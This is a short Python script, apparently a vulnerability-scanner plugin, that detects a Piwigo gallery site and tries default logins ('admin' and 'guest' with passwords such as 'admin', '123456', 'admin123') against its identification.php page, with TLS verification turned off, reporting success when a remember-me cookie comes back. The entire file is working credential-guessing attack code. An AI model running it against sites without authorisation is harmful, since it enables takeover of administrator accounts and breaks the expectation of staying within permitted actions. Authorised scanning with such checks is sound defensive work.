import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(100000, 200000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl
	session=requests.Session()
	response=session.get(url,timeout=5,verify=False)
	if 'Piwigo' in response.text:
		r1=True
	else:
		r1=False
	user_list=['admin','guest']
	pass_list=['admin','123456','admin123']
	total=[]
	for user in user_list:
		for pwd in pass_list:
			total.append((user,pwd))
	flag=[]
	for t in total:
		user=t[0]
		pwd=t[1]
		url=baseurl+"identification.php"
		body=f"username={user}&password={pwd}&login=%E7%99%BB%E5%85%A5"
		headers={'Content-Type': 'application/x-www-form-urlencoded'}
		response=session.post(url,body,headers=headers,timeout=5,verify=False)
		if len(response.history)>0 and  'pwg_remember' in str(response.history[0].headers):
			flag.append(1)
			break
	if len(flag)>0:
		r0=True
	else:
		r0=False
	if r0 and r1:
		return True
	else:
		return False
